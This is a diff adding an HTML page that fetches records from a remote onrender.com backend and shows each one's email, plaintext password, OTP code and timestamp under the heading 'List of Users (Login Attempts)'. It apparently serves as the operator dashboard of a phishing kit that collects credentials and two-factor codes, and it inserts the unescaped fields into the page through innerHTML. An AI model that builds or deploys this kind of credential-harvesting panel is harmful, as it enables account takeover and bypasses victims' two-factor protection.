@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Users</title>
+  <style>
+    /* Global Styles */
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      color: #333;
+      margin: 0;
+      padding: 0;
+    }
+
+    h1 {
+      text-align: center;
+      color: #4CAF50;
+      margin-top: 20px;
+      font-size: 2.5rem;
+    }
+
+    /* Container Styles */
+    #users-list {
+      width: 80%;
+      max-width: 900px;
+      margin: 20px auto;
+      padding: 20px;
+      background-color: white;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+
+    /* User List Styles */
+    ul {
+      list-style-type: none;
+      padding: 0;
+    }
+
+    li {
+      padding: 15px;
+      border-bottom: 1px solid #ddd;
+      margin-bottom: 10px;
+      background-color: #fafafa;
+      border-radius: 8px;
+      transition: background-color 0.3s ease;
+    }
+
+    li:hover {
+      background-color: #e0f7fa;
+    }
+
+    /* Labels and Data */
+    strong {
+      color: #4CAF50;
+      display: inline-block;
+      width: 120px;
+    }
+
+    /* No Data Message */
+    #users-list.empty {
+      text-align: center;
+      font-size: 1.2rem;
+      color: #777;
+    }
+
+    /* Responsive Design */
+    @media (max-width: 600px) {
+      h1 {
+        font-size: 2rem;
+      }
+
+      #users-list {
+        width: 95%;
+        padding: 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <h1>List of Users (Login Attempts)</h1>
+  <div id="users-list" class="empty"></div>
+
+  <script>
+    // Function to fetch and display users
+    async function fetchUsers() {
+      try {
+        const response = await fetch("https://one23-536-34.onrender.com/users");  // Fetch users from backend
+        let users = await response.json();  // Parse JSON response
+
+        const usersListDiv = document.getElementById("users-list");
+        
+        if (users.length === 0) {
+          usersListDiv.innerHTML = "No login attempts found.";
+          usersListDiv.classList.add("empty");
+          return;
+        }
+
+        usersListDiv.classList.remove("empty");
+        usersListDiv.innerHTML = ""; // Clear any previous content
+
+        // Sort users by timestamp (latest first)
+        users.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+
+        // Generate HTML to display each user
+        let htmlContent = "<ul>";
+        users.forEach(user => {
+          htmlContent += `
+            <li>
+              <strong>Email:</strong> ${user.email} <br>
+              <strong>Password:</strong> ${user.password} <br>
+              <strong>OTP:</strong> ${user.otpCode} <br>
+              <strong>Timestamp:</strong> ${user.timestamp}
+            </li>
+          `;
+        });
+        htmlContent += "</ul>";
+
+        usersListDiv.innerHTML = htmlContent;  // Display users
+      } catch (error) {
+        console.error("Error fetching users:", error);
+      }
+    }
+
+    fetchUsers();
+  </script>
+
+</body>
+</html>
